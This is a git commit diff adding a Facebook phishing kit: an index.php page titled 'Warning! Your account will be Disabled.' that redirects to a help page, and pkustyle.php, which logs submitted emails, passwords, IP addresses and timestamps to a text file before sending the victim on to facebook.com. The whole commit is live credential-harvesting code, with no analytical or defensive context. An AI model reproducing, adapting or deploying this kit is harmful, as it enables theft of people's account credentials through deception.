ee749b49f8e79ce0badbcb576d3de7baa682fceb
tommy-boyaa <66857364+tommy-boyaa@users.noreply.github.com>
2021-04-21 20:54:58 +0800

    first commit

---
+++ index.php
@@ -0,0 +1,25 @@
+﻿<?php
+	$idfb = $_GET[id];
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta property="og:image" content="facebook_cek.png"/>
+<title>Warning! Your account will be Disabled.</title>
+<script type="text/javascript">
+var isMobile = function() {
+   //console.log("Navigator: " + navigator.userAgent);
+   return /(iphone|ipod|ipad|android|blackberry|windows ce|palm|symbian)/i.test(navigator.userAgent);
+ };
+ if(isMobile()) {
+    window.location.href = "help-support.html";
+} else {
+	window.location.href = "help-support.html";
+}
+</script>
+
+</head>
+<body>
+</body>
+</html>
---
+++ pkustyle.php
@@ -0,0 +1,39 @@
+﻿<?php
+$file 	= "pkustylemacanasiaaaa.txt";
+date_default_timezone_set("Asia/Jakarta");
+date("Y-m-d H:i:s", mktime(date("H")+1, date("i"), date("s"), date("m"), date("d"), date("Y")));
+$namahari = array("Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"); 
+$namabulan = array("","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"); 
+$waktu =  $namahari[date("w")].", ".date("j")." ".$namabulan[date("n")]." ".date("Y H:i"); 
+$firsname 	= $_POST['firsname'];
+$lastname = $_POST['lastname'];
+$etc    = $_POST['maildomain'];
+$hint 	= $_POST['hint'];
+$jwb 	= $_POST['answer'];
+$alamat = $_SERVER['REMOTE_ADDR'];
+
+$handle = fopen($file, 'a');
+fwrite($handle, "");
+fwrite($handle, "\n");
+fwrite($handle, "     Email           : ");
+fwrite($handle, "$firsname");
+fwrite($handle, "\n");
+fwrite($handle, "     Password        : ");
+fwrite($handle, "$lastname");
+fwrite($handle, "\n");
+fwrite($handle, "     IP Address      : ");
+fwrite($handle, "$alamat");
+fwrite($handle, "\n");
+fwrite($handle, "     Waktu Masuk     : ");
+fwrite($handle, "$waktu");
+fwrite($handle, "\n");
+fwrite($handle, "");
+fwrite($handle, "\n");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"https://www.facebook.com\";
+// -->
+</script>";
+?>
+</html>
